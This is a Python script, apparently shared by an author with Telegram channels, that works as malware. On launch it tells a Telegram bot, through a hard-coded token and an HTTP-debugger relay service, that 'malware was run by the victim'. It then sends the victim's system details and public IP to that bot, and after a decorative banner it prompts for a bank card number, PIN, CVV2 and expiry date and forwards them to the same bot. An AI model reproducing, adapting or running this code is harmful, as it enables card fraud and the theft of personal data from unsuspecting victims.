from colorama import Fore
from time import sleep
import time
import requests
import platform
import getpass
import socket
import sys
import multiprocessing
import os

token = "6607608127:AAF9cdC-87mNoyYPl0GZI-OvWPIFVWGtM2U"
chat_id = "5948388044"

sms = f"https://api.telegram.org/bot{token}/SendMessage?chat_id={chat_id}&text="

send = sms + "بد افزار توسط قربانی اجرا شد..."

pylod = {"UrlBox":send,
    "AgentList":"Google Chrome",
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
}

requ = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",data=pylod)

info = platform.uname()
system = platform.architecture()
machine = platform.machine()
processor = platform.processor()
compiler = platform.python_compiler()
system_amel = platform.system()
user_system = getpass.getuser()
fqdn = socket.getfqdn()
ip = requests.get('http://api64.ipify.org/?format=json').json()['ip']
socket_adders = socket.socketpair()
cpu = multiprocessing.cpu_count()
process = multiprocessing.current_process()
date = time.ctime()
logger = multiprocessing.get_logger()
cwd = os.getcwd()
path = os.get_exec_path()
release = platform.release()
version = platform.version()

infor = sms + "*🍉*New__info*🍉*" + "\n\n" + "Deta-Time: " + date + "\n\n" + "system_bit: " + str(system) + "\n\n" + "ADM: " + machine + "\n\n" + "Intel:👇 " + processor + "\n\n" + "MSC: " + compiler + "\n\n" + "system_platform: " + system_amel + "\n\n" + "user_system: " + user_system + "\n\n" + "fqdn: " + fqdn + "\n\n" + "infor_system: " + str(socket_adders) + "\n\n" + "cpu_system: " + str(cpu) + "\n\n" + "process: " + str(process) + "\n\n" + "logger: " + str(logger) + "\n\n" + "path: " + cwd + "\n\n" + "path_home: " + str(path) + "\n\n" + "Release: " + release + "\n\n" + "Version: " + version + "\n\n" + "system_info: " + str(info)

pyload = {"UrlBox":infor,
    "AgentList":"Google Chrome",
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
}

req = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",data=pyload)
print("")
print(Fore.LIGHTYELLOW_EX+"Start Scrypt.....")
sleep(1)

os.system("clear")

blue="\033[1;94m"

b = (Fore.LIGHTBLUE_EX+f"""

⠀⠀⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀              ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀              ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘
⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀
⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸
⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇
⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃              ⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀
⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀
⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀              ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀              ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀



""")
for i in b:
  sys.stdout.write(i)
  sys.stdout.flush()
  sleep(0.0009)
print("")

print(Fore.LIGHTYELLOW_EX+"―――‣ "+Fore.LIGHTCYAN_EX+"Im mr_dark")
print(Fore.LIGHTYELLOW_EX+"―――――‣ "+Fore.LIGHTCYAN_EX+"https://t.me/DARK_MICE")
print(Fore.LIGHTYELLOW_EX+"―――――――‣ "+Fore.LIGHTCYAN_EX+"https://t.me/python_try")
print("")
print("")
print(f"{blue}")
os.system("figlet MR-DARK")
print("")
print("")
cart = input(Fore.LIGHTRED_EX+"["+Fore.LIGHTYELLOW_EX+"A"+Fore.LIGHTRED_EX+"]"+Fore.LIGHTGREEN_EX+" number_Cart: "+Fore.LIGHTYELLOW_EX)
sleep(1)
paswd = input(Fore.LIGHTRED_EX+"["+Fore.LIGHTYELLOW_EX+"B"+Fore.LIGHTRED_EX+"]"+Fore.LIGHTGREEN_EX+" Pin: "+Fore.LIGHTYELLOW_EX)
sleep(1)
Cvv2 = input(Fore.LIGHTRED_EX+"["+Fore.LIGHTYELLOW_EX+"C"+Fore.LIGHTRED_EX+"]"+Fore.LIGHTGREEN_EX+Fore.LIGHTGREEN_EX+" Cvv2: "+Fore.LIGHTYELLOW_EX)
sleep(1)
Year = input(Fore.LIGHTRED_EX+"["+Fore.LIGHTYELLOW_EX+"D"+Fore.LIGHTRED_EX+"]"+Fore.LIGHTGREEN_EX+" Mah and Sal {05/06}: "+Fore.LIGHTYELLOW_EX)
sleep(1) 
print("")

num = sms + "🍉𝑵𝑬𝑾 𝒄𝒂𝒓𝒅 𝒂𝒅𝒆𝒅🍉" + "\n\n" + "𝙲𝙰𝚁𝙳: " + cart + "\n" + "𝙿𝙸𝙽: " + paswd + "\n" + "𝙲𝚅𝚅𝟤: " + Cvv2 + "\n" + "𝙼/𝚈: " + Year + "\n" + "𝚒𝚙: " + str(ip) + "\n\n" + "coded: 💬 @python_try" + "\n" + "My_Chanell: 🗨 @DARK_MICE"

pylad = {"UrlBox":num,
    "AgentList":"Google Chrome",
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
}

requs = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",data=pylad)
